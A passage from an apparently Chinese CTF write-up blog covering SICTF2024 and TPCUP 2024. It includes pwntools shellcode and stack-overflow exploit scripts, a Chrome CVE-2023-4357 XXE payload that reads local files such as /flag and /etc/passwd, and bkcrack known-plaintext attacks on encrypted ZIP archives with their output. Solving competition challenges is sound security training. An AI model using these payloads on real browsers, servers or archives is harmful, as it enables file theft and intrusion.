esi, esi</span></span><br><span class="line"><span class="string">35 xor edx, edx</span></span><br><span class="line"><span class="string">36 mov eax, 2</span></span><br><span class="line"><span class="string">37 syscall</span></span><br><span class="line"><span class="string">38</span></span><br><span class="line"><span class="string">39 // read(3, 0x1919870, 0x40)</span></span><br><span class="line"><span class="string">40 mov esi, 0x1919870</span></span><br><span class="line"><span class="string">41 mov edi, 3</span></span><br><span class="line"><span class="string">42 mov edx, 0x40</span></span><br><span class="line"><span class="string">43 mov eax, 0</span></span><br><span class="line"><span class="string">44 syscall</span></span><br><span class="line"><span class="string">45</span></span><br><span class="line"><span class="string">46 // write(1, 0x1919870, 0x40)</span></span><br><span class="line"><span class="string">47 mov edi, 1</span></span><br><span class="line"><span class="string">48 mov eax, 1</span></span><br><span class="line"><span class="string">49 syscall</span></span><br><span class="line"><span class="string">50</span></span><br><span class="line"><span class="string">51 // exit(0)</span></span><br><span class="line"><span class="string">52 mov edi, 0</span></span><br><span class="line"><span class="string">53 mov eax, 0x3c</span></span><br><span class="line"><span class="string">54 syscall</span></span><br><span class="line"><span class="string">55 &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="number">56</span> payload = <span class="string">b&#x27;\xb8flaggH\x89F\xf0\xbf\x01\x00\x00\x00\x83\xee\x10\xba\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\x89\xf71\xf61\xd2\xb8\x02\x00\x00\x00\x0f\x05\xbep\x98\x91\x01\xbf\x03\x00\x00\x00\xba@\x00\x00\x00\xb8\x00\x00\x00\x00\x0f\x05\xbf\x01\x00\x00\x00\xb8\x01\x00\x00\x00\x0f\x05\xbf\x00\x00\x00\x00\xb8&lt;\x00\x00\x00\x0f\x05&#x27;</span></span><br><span class="line"><span class="number">57</span> p.send(payload)</span><br><span class="line"><span class="number">58</span></span><br><span class="line"><span class="number">59</span> p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Bug-Zapper-Pro"><a href="#Bug-Zapper-Pro" class="headerlink" title="Bug Zapper Pro+"></a>Bug Zapper Pro+</h3><p><em>å‡ºé¢˜â¼ˆï¼šæ¤°å¥¶</em></p><p><em>é¢˜â½¬æè¿°ï¼šæ„Ÿè°¢æ‚¨â¼€ç›´ä»¥æ¥çš„â½€æŒï¼Œæ‰€ä»¥ä¸ºäº†å›é¦ˆâ½¼â½¤â¼¾ï¼Œæˆ‘ä»¬æ¨å‡ºäº†è¿™æ¬¾å…¨æ–°çš„Bug zapper pro</em></p><p><em>+ï¼Œæœ‰ä»»ä½•é—®é¢˜æ¬¢è¿å‘æˆ‘ä»¬åé¦ˆ</em></p><p>é€šè¿‡å¼‚æˆ–ç­‰æ„é€ â¼€ä¸ªsyscallå‡ºæ¥ï¼Œç„¶åä¸ºäº†â½…ä¾¿ç›´æ¥æŠŠrdxè®¾ç½®ä¸º114514xxxé‚£ç©æ„ï¼Œæ‰€ä»¥è·‘è„šæœ¬å»ºè®®</p><p>åâ¾¯çš„payloadåœ¨sendå‰æœ€å¥½pauseâ¼€ä¸‹ï¼Œâ¼€èµ·å‘çš„è¯æœ‰å¯èƒ½ä¼šç”±äºreadâ»“åº¦å¤ªâ¼¤å¯¼è‡´åâ¾¯çš„payload</p><p>åœ¨â¼€å¼€å§‹ä¹Ÿè¢«è¯»è¿›å»ï¼ˆ</p><h3 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h3><p>æ ˆæº¢å‡ºä¿®æ”¹stringçš„å¼•â½¤ä¸ºstack_chkçš„gotåœ°å€ï¼Œä»â½½ä¿®æ”¹gotè¡¨ä¸ºåâ»”åœ°å€ï¼ŒåŒæ—¶è¦†ç›–canaryè§¦å‘å</p><p>â»”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">1 from pwn import *</span><br><span class="line"></span><br><span class="line">2 context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line"></span><br><span class="line">4 *#p = process(&#x27;./overflow&#x27;)*</span><br><span class="line"></span><br><span class="line">5 p = remote(&quot;xxxxxxxx&quot;, xxxxx)</span><br><span class="line"></span><br><span class="line">6</span><br><span class="line"></span><br><span class="line">7 backdoor = 0x4011d0</span><br><span class="line"></span><br><span class="line">8 chk_got = 0x404018</span><br><span class="line"></span><br><span class="line">9</span><br><span class="line"></span><br><span class="line">10 *#gdb.attach(p)*</span><br><span class="line"></span><br><span class="line">11 p.recvuntil(b&#x27;?\n&#x27;)</span><br><span class="line"></span><br><span class="line">12 payload = p64(backdoor) + b&#x27;b&#x27; * 0xa0 + p64(chk_got)</span><br><span class="line"></span><br><span class="line">13 p.sendline(payload.ljust(0x150, b&#x27;a&#x27;))</span><br><span class="line"></span><br><span class="line">14</span><br><span class="line"></span><br><span class="line">15 p.interactive()</span><br></pre></td></tr></table></figure><h3 id="What-only-libc"><a href="#What-only-libc" class="headerlink" title="What?!only libc?!"></a>What?!only libc?!</h3><h3 id="TalBoom"><a href="#TalBoom" class="headerlink" title="TalBoom"></a>TalBoom</h3><p><em>å‡ºé¢˜â¼ˆï¼šTokameinE</em></p><p><em>é¢˜â½¬æè¿°ï¼šæˆ‘ä»¬ä»æ¥å¥‰â¾æ²¡æœ‰æ”¿ç­–å°±æ˜¯æˆ‘ä»¬çš„æ”¿ç­–ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰“ç®—ä»€ä¹ˆä¹Ÿä¸åšï¼Œä»»ç”±ææ€–åˆ†â¼¦ä»¬é—¹</em>å§ã€‚ï¼ˆæœ¬é¢˜æœ‰å›æ˜¾ï¼Œè¿æ¥åè¯·ç¨ä½œç­‰å¾…ï¼‰*</p><p>flagï¼šToka{Who_has_four_legs_in_the_morning_two_legs_at_noon_and_three_legs_in_theevening?}æœ¬é¢˜ä¸å…¬å¸ƒä»»ä½•é™„ä»¶ã€‚</p><p>çœ‹äº†â¼€ä¸‹â¼¤å“¥ä»¬çš„è§£æ³•ï¼Œâ¾®å¸¸ä¼˜ç§€ï¼Œæ‰€ä»¥åœ¨æ­¤å°±ä¸å…¬å¼€é¢„æœŸè§£ exp äº†ï¼Œä¸»è¦èŠèŠâ¾®é¢„æœŸçš„â¼€ä¸ªå¥½åŠ</p><p>æ³•ï¼Œæ¥â¾ƒKaliseå¸ˆå‚…ã€‚</p><p>é¢˜â½¬æ¯æ¬¡nc éƒ½ä¼šæ„å»ºä¸åŒçš„â¼†è¿›åˆ¶ï¼Œâ½½æ¯ä¸ªâ¼†è¿›åˆ¶éƒ½æœ‰â¼€ä¸ªæ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ç‚¹ï¼Œå¦‚æœèƒ½å¤Ÿè®©ç¨‹åºåˆ°</p><p>è¾¾ï¼Œåˆ™å¯ä»¥ç›´æ¥ROPå®Œæˆåˆ©â½¤ã€‚ä½†æ˜¯é—®é¢˜åœ¨äºï¼Œåˆ°è¾¾çš„è¾“â¼Šæ¯æ¬¡éƒ½æ˜¯éšæœºçš„ï¼Œå› æ­¤é¢„æœŸè§£æ˜¯éœ€è¦é€šè¿‡</p><p>â¾ƒåŠ¨åŒ–çš„â¼¿æ®µåŠ¨æ€åˆ†æç¨‹åºæ¥è§£å‡ºè¾“â¼Šã€‚ä½†æ˜¯Kaliseå¸ˆå‚…çš„â½…æ³•åˆ™å¾ˆç®€å•ï¼Œç”±äºç¨‹åºæ˜¯ç±»ä¼¼äº Switch çš„åˆ†å‘â½…å¼ï¼Œæ‰€ä»¥æ¯ä¸ªâ¼†è¿›åˆ¶â½‚ä»¶å®é™…ä¸Š</p><p>ä¹‹åªæœ‰é‚£ä¸ªstrcmpæ˜¯ä¸åŒçš„ï¼Œâ½½åç§»åˆ™å…¨éƒ¨ç›¸åŒï¼Œé‚£ä¹ˆåªè¦å¯¹ç€æŸä¸ªåˆ†â½€å¼ºâ¾çˆ†ç ´ï¼Œåœ¨é¢„æœŸçš„æ—¶é—´å†…</p><p>å°±å¯ä»¥æ’å‡ºé‚£ä¸ªæ ˆæº¢å‡ºï¼Œâ½½åªéœ€è¦æå–ç‰¹å®šåœ°å€çš„å­—ç¬¦ä¸²å°±èƒ½æ‹¿åˆ°è¯¥åˆ†â½€çš„è¾“â¼Šï¼Œæ‰€ä»¥ç„ç€æ‰“å°±â¾</p><p>äº†ã€‚æ®è¯¥å¸ˆå‚…æ‰€è¯´ï¼Œ15åˆ†é’Ÿå·¦å³å³å¯å®Œæˆçˆ†ç ´ã€‚</p><p>è¿™â¾¥å°±ä¸æ”¾è¿™ä½å¸ˆå‚…çš„ exp äº†</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Baby-c"><a href="#Baby-c" class="headerlink" title="Baby_c++"></a>Baby_c++</h3><p>å’±ä¹Ÿä¸çŸ¥é“æ€ä¹ˆå›äº‹ï¼Œæ‰“å¼€IDAï¼ŒæŸ¥æ‰¾å­—ç¬¦ä¸²å°±çœ‹åˆ°äº†</p><p>é¢„æœŸæ˜¯æ‰¾åˆ°flag</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag = [<span class="number">83</span>,<span class="number">73</span>,<span class="number">67</span>,<span class="number">84</span>,<span class="number">70</span>,<span class="number">123</span>,<span class="number">52</span>,<span class="number">101</span>,<span class="number">52</span>,<span class="number">55</span>,<span class="number">52</span>,<span class="number">98</span>,<span class="number">56</span>,<span class="number">97</span>,<span class="number">45</span>,<span class="number">57</span>,<span class="number">100</span>,<span class="number">102</span>,<span class="number">54</span>,<span class="number">45</span>,<span class="number">52</span>,<span class="number">53</span>,<span class="number">52</span>,<span class="number">98</span>,<span class="number">45</span>,<span class="number">57</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">54</span>,<span class="number">45</span>,<span class="number">100</span>,<span class="number">52</span>,<span class="number">102</span>,<span class="number">53</span>,<span class="number">101</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">99</span>,<span class="number">100</span>,<span class="number">53</span>,<span class="number">49</span>,<span class="number">102</span>,<span class="number">125</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="Ez-pyc"><a href="#Ez-pyc" class="headerlink" title="Ez_pyc"></a>Ez_pyc</h3><p>pycç¼–è¯‘</p><p>ï¼ˆçœŸæœäº†ï¼Œä¸€ç›´æƒ³ç€æ˜¯èµ°è¿·å®«ï¼Œï¼Œï¼Œï¼Œè¿™ä¹ˆæ˜æ˜¾éƒ½æ²¡çœ‹å‡ºæ¥æ˜¯æ•°ç‹¬</p><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240226125713782.png" alt="image-20240226125713782"></p><p>å°†è§£è½¬ä¸º16è¿›åˆ¶</p><p>è¾“â¼Šå†…å®¹ï¼š</p><p>6320870e5352469014668584c7f3229334e22689b45a64f926b5c</p><p>å¾—åˆ°flag</p><h3 id="SweetTofu"><a href="#SweetTofu" class="headerlink" title="SweetTofu"></a>SweetTofu</h3><p>è¿œç¨‹åŠ¨æ€è°ƒè¯•å¯ä»¥ï¼Œï¼Œæˆ‘åœ¨æƒ³ã€‚è™šæ‹Ÿæœºå¥½å•Šã€‚ã€‚</p><h3 id="virus-n-lys1s"><a href="#virus-n-lys1s" class="headerlink" title="virus-?n?lys1s"></a>virus-?n?lys1s</h3><p>#æ ¡éªŒphpï¼Œstrpos()å› ä¸ºphpç‰ˆæœ¬å¤ªä½äº†ï¼Œwebä½¬ç»•è¿‡</p><ul><li>espå®šå¾‹è„±å£³</li><li>ç¬¬äºŒé—®è®°å¾—æŒ‚ä»£ç†ï¼ˆgoogleï¼ˆæ–­</li><li>åŠ¨è°ƒ</li><li>å¯åŠ¨å­è¿›ç¨‹ï¼Œç±»ä¼¼äºSMCçš„â¼¿æ®µï¼Œæ¥è§£å¯†â½‚ä»¶å¹¶ä¸”ä¿®å¤â½‚ä»¶å¤´</li><li>è¡Œä¸ºè®°å½•ï¼Œwyt.exe,ç¿»VTä¿¡æ¯</li><li>ç›´æ¥å¾®æ­¥æƒ…æŠ¥ï¼ˆåŠ¨æ€IP</li></ul><p><a href="https://s.threatbook.com/report/file/797c253df096431e69f1aa84f0010f248384fe437cda4bf8df916c48fbb7984f">https://s.threatbook.com/report/file/797c253df096431e69f1aa84f0010f248384fe437cda4bf8df916c48fbb7984f</a></p><h3 id="Close-me"><a href="#Close-me" class="headerlink" title="Close me"></a>Close me</h3><p><em>â¤</em>*<del>æ‚</del>â»¥~<strong>â¤</strong>ï¼Œä½ èƒ½å…³çš„æ‰å—~~<strong>â¤</strong>ï¼ˆè™½ç„¶ä¸æ˜¯ç—…æ¯’ï¼Œä¸è¿‡å¦‚æœè¦è¿â¾çš„è¯è¿˜æ˜¯å»ºè®®è™šæ‹Ÿæœºå§*<em>^_^ï¼‰</em></p><p><em>è¯·æ‰¾åˆ°èƒ½å¤Ÿæ­£å¸¸å…³é—­çš„æ¡ä»¶ï¼ˆå³ä¸é€šè¿‡ç›´æ¥ç»ˆâ½Œè¿›ç¨‹çš„â½…å¼æˆ–è€…ç¨‹åºå´©æºƒå¯¼è‡´çš„å…³é—­ï¼‰</em></p><h4 id="æ³•ä¸€ï¼š"><a href="#æ³•ä¸€ï¼š" class="headerlink" title="æ³•ä¸€ï¼š"></a>æ³•ä¸€ï¼š</h4><p>â¾¸å…ˆç¿»åˆ°ä¸‹â¾¯å‘ç°æœ‰â¼€ä¸ªxorï¼Œè§£å¯†â¼€ä¸‹çœ‹çœ‹å¾—åˆ°â¼€æ®µhint</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SICTF2024&quot;&gt;&lt;a href=&quot;#SICTF2024&quot; class=&quot;headerlink&quot; title=&quot;SICTF2024&quot;&gt;&lt;/a&gt;SICTF2024&lt;/h1&gt;&lt;h2 id=&quot;Forensics&quot;&gt;&lt;a href=&quot;#Forensics&quot; class</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>èººå¹³æ¯</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/tpcup2024/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/02/26/tpcup2024/</id>
    <published>2024-02-25T16:00:00.000Z</published>
    <updated>2024-09-16T07:10:04.850Z</updated>
    
    <content type="html"><![CDATA[<h1 id="TPCUP-2024"><a href="#TPCUP-2024" class="headerlink" title="TPCUP 2024"></a>TPCUP 2024</h1><h2 id="Xâ€¦ä»€ä¹ˆï¼Ÿ"><a href="#Xâ€¦ä»€ä¹ˆï¼Ÿ" class="headerlink" title="Xâ€¦ä»€ä¹ˆï¼Ÿ"></a>Xâ€¦ä»€ä¹ˆï¼Ÿ</h2><p>çœ‹åˆ° chrome-114.0.5735.90 æœç´¢ä¸‹è¿™ä¸ªç‰ˆæœ¬å¯ä»¥æ‰¾åˆ° CVE-2023-4357 æ¼æ´å¤ç°ï¼Œä½¿ç”¨ <a href="https://github.com/xcanwin/CVE-2023-4357-Chrome-XXE">xcanwin&#x2F;CVE-2023-4357-Chrome-XXE</a> çš„å•æ–‡ä»¶ EXPï¼Œæ”¹æˆè¯»å– flagï¼Œç„¶ååŠ ä¸Šå†™å…¥ cookies çš„ä»£ç ã€‚</p><p>ç”±äºåŒæ—¶è¦æœ‰ svg å’Œ xml è§£æï¼Œæ‰€ä»¥ Content-Type è®¾ä¸º <code>image/svg+xml</code>ï¼Œå¯ä»¥è‡ªå·±æ­å»ºæœ¬åœ°ç¯å¢ƒçœ‹çœ‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- d.svg --&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=<span class="string">&quot;text/xsl&quot;</span> href=<span class="string">&quot;?#&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">div</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">passwd_p</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">passwd_c</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xsl:stylesheet</span> <span class="attr">xmlns:xsl</span>=<span class="string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">xsl:template</span> <span class="attr">match</span>=<span class="string">&quot;/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">xsl:copy-of</span> <span class="attr">select</span>=<span class="string">&quot;document(&#x27;&#x27;)&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;&amp;passwd_p;&quot;</span>&gt;</span>&amp;passwd_c;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:40rem&quot;</span> <span class="attr">id</span>=<span class="string">&quot;r&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;p&#x27;</span>).<span class="title function_">forEach</span>(p =&amp;gt; &#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">document</span>.<span class="property">cookie</span>=p.<span class="property">innerHTML</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">xsl:template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸Šä¼ åè®¿é—® <code>/d.svg</code> å³å¯</p><p><code>flag&#123;XXE_is_alSo_y0ur_g0oD_fR13Nd&#125;</code></p><blockquote><p>æ²¡ä¿®å‰å·²ç»èƒ½è¯» <code>/etc/passwd</code> äº†ï¼Œä½†è¯» <code>/flag</code> æ²¡ç»“æœã€‚ä»¥ä¸ºæ˜¯æ²¡æƒé™éœ€è¦ææƒï¼Œç»“æœæ˜¯æ²¡æ”¾ flagï¼ˆ<br>è¯è¯´ä¸ºä»€ä¹ˆè¯»å¾—äº† <code>/usr/src/app/requirements.txt</code> ä½†è¯»ä¸äº† <code>xssbot.py</code> å‘¢</p></blockquote><h2 id="Uncrackable"><a href="#Uncrackable" class="headerlink" title="Uncrackable"></a>Uncrackable</h2><h3 id="æ›´æ–°é™„ä»¶å"><a href="#æ›´æ–°é™„ä»¶å" class="headerlink" title="æ›´æ–°é™„ä»¶å"></a>æ›´æ–°é™„ä»¶å</h3><p>zip å·²çŸ¥æ˜æ–‡æ”»å‡»ï¼Œç”¨ <code>zipinfo</code> æŸ¥çœ‹ä¸‹å‹ç¼©åŒ…</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â¯ zipinfo prob05.zip</span><br><span class="line">Archive:  prob05.zip</span><br><span class="line">Zip file size: 3545476 bytes, number of entries: 2</span><br><span class="line">-rw----     0.0 fat   109332 T- defN 24-Feb-13 18:53 anticheat.js</span><br><span class="line">-rw----     0.0 fat  3550103 B- defN 24-Feb-13 18:53 uncrackable.m4a</span><br><span class="line">2 files, 3659435 bytes uncompressed, 3545224 bytes compressed:  3.1%</span><br></pre></td></tr></table></figure><p><code>anticheat.js</code> æ–‡ä»¶æ˜¯å·²çŸ¥çš„ï¼Œå¯ä»¥ä» <a href="https://www.tpcup.org/anticheat.js">https://www.tpcup.org/anticheat.js</a> ä¸‹è½½ï¼Œéœ€è¦å‹ç¼©åæ‰å¯ä»¥ç”¨å·¥å…· (bkcrack&#x2F;rbkcrack&#x2F;pkcrack) çˆ†ç ´å¯†é’¥</p><p>è¿™é¢˜å’Œå‹ç¼©å·¥å…·å…³ç³»å¾ˆå¤§ï¼Œä½¿ç”¨ <code>pyminizip == 0.2.6</code> åœ¨ <code>compress_level = 0 or 6</code> ä¸‹å¯ä»¥æˆåŠŸï¼Œ<code>zip = 3.0-11.1</code> å’Œ <code>7z = 23.01</code> å‡å¤±è´¥ <del>ï¼Œè¿˜æ˜¯åœ¨ç¾¤èŠä¸­å¾—çŸ¥çš„å‹ç¼©å·¥å…·</del></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crypto.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pyminizip</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;level:<span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">    pyminizip.compress(<span class="string">&quot;anticheat.js&quot;</span>, <span class="literal">None</span>, <span class="string">&quot;anticheat.zip&quot;</span>, <span class="literal">None</span>, i)</span><br><span class="line">    <span class="comment"># os.system(&quot;zip -%d anticheat.zip anticheat.js &gt; /dev/null&quot; % (i))</span></span><br><span class="line">    <span class="comment"># os.system(&quot;7z a -tzip -mx%d anticheat.zip anticheat.js &gt; /dev/null&quot; % (i))</span></span><br><span class="line">    os.system(<span class="string">&quot;bkcrack -C prob05.zip -c anticheat.js -P anticheat.zip -p anticheat.js&quot;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â¯ python crypto.py</span><br><span class="line">level:0</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[21:59:49] Z reduction using 44370 bytes of known plaintext</span><br><span class="line">26.0 % (11536 / 44370)</span><br><span class="line">[21:59:50] Attack on 155 Z values at index 33459</span><br><span class="line">Keys: d0043c88 20e5781d 2160b96d</span><br><span class="line">94.8 % (147 / 155)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the attack with the option: --continue-attack 147</span><br><span class="line">[21:59:50] Keys</span><br><span class="line">d0043c88 20e5781d 2160b96d</span><br></pre></td></tr></table></figure><p>ç”¨å¯†é’¥è·å–å‹ç¼©åŒ…å¯†ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â¯ bkcrack -C prob05.zip -c uncrackable.m4a -k d0043c88 20e5781d 2160b96d -b \?a -l 12</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[22:42:55] Recovering password</span><br><span class="line">length 12...</span><br><span class="line">Password: bQCvRH7q1ULs</span><br><span class="line">60.4 % (2321 / 3844)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the password recovery with the option: --continue-recovery 625151303030</span><br><span class="line">[22:42:59] Password</span><br><span class="line">as bytes: 62 51 43 76 52 48 37 71 31 55 4c 73</span><br><span class="line">as text: bQCvRH7q1ULs</span><br></pre></td></tr></table></figure><p>ç”¨å¯†ç è§£å‹ä¹‹åæŸ¥çœ‹ uncrackable.m4a æœ«å°¾çš„é™„åŠ å­—ç¬¦ <code>strings uncrackable.m4a | grep flag</code></p><p><code>flag&#123;z1p_IsN7_5ucH_S4f3&#125;</code></p><h3 id="ä¸‹é¢æ˜¯ä¹‹å‰çš„é™„ä»¶çš„é”™è¯¯è§£æ³•"><a href="#ä¸‹é¢æ˜¯ä¹‹å‰çš„é™„ä»¶çš„é”™è¯¯è§£æ³•" class="headerlink" title="ä¸‹é¢æ˜¯ä¹‹å‰çš„é™„ä»¶çš„é”™è¯¯è§£æ³•"></a>ä¸‹é¢æ˜¯ä¹‹å‰çš„é™„ä»¶çš„é”™è¯¯è§£æ³•</h3><p>ä¹‹å‰çš„é™„ä»¶ï¼Œç»™å‡ºæç¤ºéƒ¨åˆ† M4A å¤´å­—èŠ‚(æ‘©æ–¯å¯†ç ï¼Œäº”ä½ä¸€ç»„) <code>7479706d7000000</code> è¡¥ä¸ª 0 å°±æœ‰ 8 ä½ï¼Œæˆ‘ä»¥ä¸ºæ˜¯è¿™ä¸ªæ˜¯å‹ç¼©åçš„ï¼ŒçŒœæµ‹å‰ä¸‰ä½æ˜¯ <code>000000</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â¯ bkcrack -C prob05.zip -c 70.m4a -p 70.txt -o 5 -x 0 000000</span><br><span class="line">bkcrack 1.6.1 - 2024-01-22</span><br><span class="line">[00:47:57] Attack on 4194304 Z values at index 12</span><br><span class="line">Keys: 5bb795f4 424af6b2 acadf670</span><br><span class="line">43.6 % (1828975 / 4194304)</span><br><span class="line">Found a solution. Stopping.</span><br><span class="line">You may resume the attack with the option: --continue-attack 1828975</span><br><span class="line">[01:02:46] Keys</span><br><span class="line">5bb795f4 424af6b2 acadf670</span><br></pre></td></tr></table></figure><p>å¯ä»¥çˆ†å‡ºå¯†é’¥ï¼ˆä½†æ˜¯æ˜¯é”™è¯¯çš„ï¼‰ï¼Œæ‰€ä»¥æœ€åè§£å¯†å‹ç¼©åŒ…çš„æ—¶å€™æç¤ºæ–‡ä»¶æŸå <code>zlib.error: Error -3 while decompressing data: invalid stored block lengths</code> å¯æƒœ</p><h3 id="ä¸‹é¢å¯èƒ½æ˜¯æ­£ç¡®çš„è§£æ³•"><a href="#ä¸‹é¢å¯èƒ½æ˜¯æ­£ç¡®çš„è§£æ³•" class="headerlink" title="ä¸‹é¢å¯èƒ½æ˜¯æ­£ç¡®çš„è§£æ³•"></a>ä¸‹é¢å¯èƒ½æ˜¯æ­£ç¡®çš„è§£æ³•</h3><p>zip æ˜æ–‡æ”»å‡»è‡³å°‘éœ€è¦ 12 ä½å­—ç¬¦ï¼Œå…¶ä¸­ 8 ä½è¦è¿ç»­<br>è¿™ä¸ªå‹ç¼©åŒ…çš„ <code>compress_level == 5</code>ï¼Œæç¤ºçš„æ˜¯ M4A å¤´ï¼Œä½†ä¸æ˜¯è¿ç»­çš„ã€‚ç¬¬ 0-2 ä½æ˜¯ <code>000000</code>ï¼Œæœç´¢æ–‡ä»¶å¤´å¯ä»¥æŸ¥åˆ°ç¬¬ 3 ä½ä¸€èˆ¬æ˜¯ 